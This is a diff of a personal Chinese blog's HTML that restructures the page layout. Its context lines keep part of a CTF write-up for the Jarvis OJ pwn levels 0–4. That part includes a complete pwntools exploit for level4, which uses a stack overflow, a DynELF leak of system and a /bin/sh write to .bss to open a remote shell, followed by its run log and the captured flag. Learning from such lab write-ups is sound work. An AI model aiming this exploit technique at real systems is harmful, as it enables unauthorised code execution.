@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="入门,ctf,pwn,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -79,18 +79,13 @@
 
 
 
-<meta name="description" content="Jarvis OJ PWN题wp（level0 - level4）level0 这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了  main函数反编译：12345int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  write(1, &quot;Hello, World\n&quot;, 0xDuLL);  re">
-<meta name="keywords" content="入门,ctf,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ-pwn-0~4题解">
-<meta property="og:url" content="http://yoursite.com/2019/04/22/JarvisOJ-pwn-0-4/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="学逆向的阿昆达">
+<meta property="og:url" content="http://yoursite.com/page/6/index.html">
 <meta property="og:site_name" content="学逆向的阿昆达">
-<meta property="og:description" content="Jarvis OJ PWN题wp（level0 - level4）level0 这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了  main函数反编译：12345int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  write(1, &quot;Hello, World\n&quot;, 0xDuLL);  re">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-22T07:01:34.577Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ-pwn-0~4题解">
-<meta name="twitter:description" content="Jarvis OJ PWN题wp（level0 - level4）level0 这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了  main函数反编译：12345int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  write(1, &quot;Hello, World\n&quot;, 0xDuLL);  re">
+<meta name="twitter:title" content="学逆向的阿昆达">
 
 
 
@@ -120,13 +115,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/04/22/JarvisOJ-pwn-0-4/">
+  <link rel="canonical" href="http://yoursite.com/page/6/">
 
 
 
 
 
-  <title>JarvisOJ-pwn-0~4题解 | 学逆向的阿昆达</title>
+  <title>学逆向的阿昆达</title>
   
 
 
@@ -145,7 +140,8 @@
     
   
 
-  <div class="container sidebar-position-right page-post-detail">
+  <div class="container sidebar-position-right 
+  page-home">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -228,9 +224,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
 
   
 
@@ -260,7 +256,9 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">JarvisOJ-pwn-0~4题解</h1>
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/22/JarvisOJ-pwn-0-4/" itemprop="url">JarvisOJ-pwn-0~4题解</a></h1>
         
 
         <div class="post-meta">
@@ -332,7 +330,9 @@
       
 
       
-        <h1 id="Jarvis-OJ-PWN题wp（level0-level4）"><a href="#Jarvis-OJ-PWN题wp（level0-level4）" class="headerlink" title="Jarvis OJ PWN题wp（level0 - level4）"></a>Jarvis OJ PWN题wp（level0 - level4）</h1><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote>
+        
+          
+            <h1 id="Jarvis-OJ-PWN题wp（level0-level4）"><a href="#Jarvis-OJ-PWN题wp（level0-level4）" class="headerlink" title="Jarvis OJ PWN题wp（level0 - level4）"></a>Jarvis OJ PWN题wp（level0 - level4）</h1><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote>
 <p>这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了</p>
 </blockquote>
 <p><code>main</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1L</span>L, <span class="string">"Hello, World\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
@@ -362,6 +362,8 @@
 <p>思路与level3大致相同，不过这次没有给出libc，百度了wp才知道需要用到DynELF模块暴力跑出system的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9880'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system地址后需要向可执行段写入/bin/sh，因为开启了NX保护，这里选择向bss段写入</span></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#不断返回到vuln，每次溢出都调用write，伪造参数，打印地址，利用DynELF得到system绝对地址</span></span><br><span class="line">    payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">0x1</span>) + p32(addr) + p32(<span class="number">0x4</span>)</span><br><span class="line">    sh.sendline(payload_leak)</span><br><span class="line">    leak = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read参数，溢出返回到read，并向目标地址（bss段）写入/bin/sh</span></span><br><span class="line">payload_write = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0x0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">sh.sendline(payload_write)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>) <span class="comment">#这步结束后，再次返回到vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">useless_addr = <span class="number">0x11111111</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(useless_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
 <p>执行效果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Loading from <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span>: 0xf77de930</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf77de930</span><br><span class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">[*] Trying lookup based on Build ID: de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] Skipping unavialable libc de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf77afdd8</span><br><span class="line">[*] Found DT_STRTAB at 0xf77afde0</span><br><span class="line">[*] Found DT_SYMTAB at 0xf77afde8</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">[*] <span class="built_in">hash</span> chain index</span><br><span class="line">[*] <span class="built_in">hash</span> chain</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
 
+          
+        
       
     </div>
     
@@ -376,40 +378,14 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/入门/" rel="tag"># 入门</a>
-          
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
+
+      
+
       
 
       
       
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/22/寒假任务笔记/" rel="prev" title="寒假任务笔记">
-                寒假任务笔记 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -419,11 +395,14 @@
   </article>
 
 
+    
+  </section>
 
-    <div class="post-spread">
-      
-    </div>
-  </div>
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
+  </nav>
+
 
 
           </div>
@@ -431,10 +410,6 @@
 
 
           
-
-  
-
-
 
         </div>
         
@@ -455,17 +430,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -527,22 +493,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jarvis-OJ-PWN题wp（level0-level4）"><span class="nav-number">1.</span> <span class="nav-text">Jarvis OJ PWN题wp（level0 - level4）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">1.1.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">1.2.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.3.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.4.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">1.5.</span> <span class="nav-text">level4</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -683,10 +633,6 @@
   
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
